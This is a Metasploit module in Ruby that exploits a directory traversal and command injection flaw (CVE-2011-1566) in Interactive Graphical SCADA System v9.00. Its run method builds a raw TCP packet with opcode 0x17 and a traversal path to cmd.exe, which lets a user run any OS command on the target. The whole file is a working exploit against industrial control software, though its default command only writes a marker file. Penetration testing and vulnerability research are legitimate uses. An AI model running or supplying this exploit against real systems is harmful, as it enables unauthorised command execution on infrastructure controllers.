##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Interactive Graphical SCADA System Remote Command Injection',
      'Description'    => %q{
          This module abuses a directory traversal flaw in Interactive
        Graphical SCADA System v9.00. In conjunction with the traversal
        flaw, if opcode 0x17 is sent to the dc.exe process, an attacker
        may be able to execute arbitrary system commands.
      },
      'Author'         => [ 'Luigi Auriemma', 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2011-1566'],
          [ 'OSVDB', '72349'],
          [ 'URL', 'http://aluigi.org/adv/igss_8-adv.txt' ],
        ],
      'DisclosureDate' => 'Mar 21 2011'))

    register_options(
      [
        Opt::RPORT(12397),
        OptString.new('CMD', [ false, 'The OS command to execute', 'echo metasploit > %SYSTEMDRIVE%\\metasploit.txt']),
      ], self.class)
  end

  def run

    connect

    exec = datastore['CMD']

    packet =  [0x00000100].pack('V') + [0x00000000].pack('V')
    packet << [0x00000100].pack('V') + [0x00000017].pack('V')
    packet << [0x00000000].pack('V') + [0x00000000].pack('V')
    packet << [0x00000000].pack('V') + [0x00000000].pack('V')
    packet << [0x00000000].pack('V') + [0x00000000].pack('V')
    packet << [0x00000000].pack('V')
    packet << "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
    packet << "windows\\system32\\cmd.exe\" /c #{exec}"
    packet << "\x00" * (143 + exec.length)

    print_status("Sending command: #{exec}")
    sock.put(packet)
    sock.get_once(-1,0.5)
    disconnect

  end

end
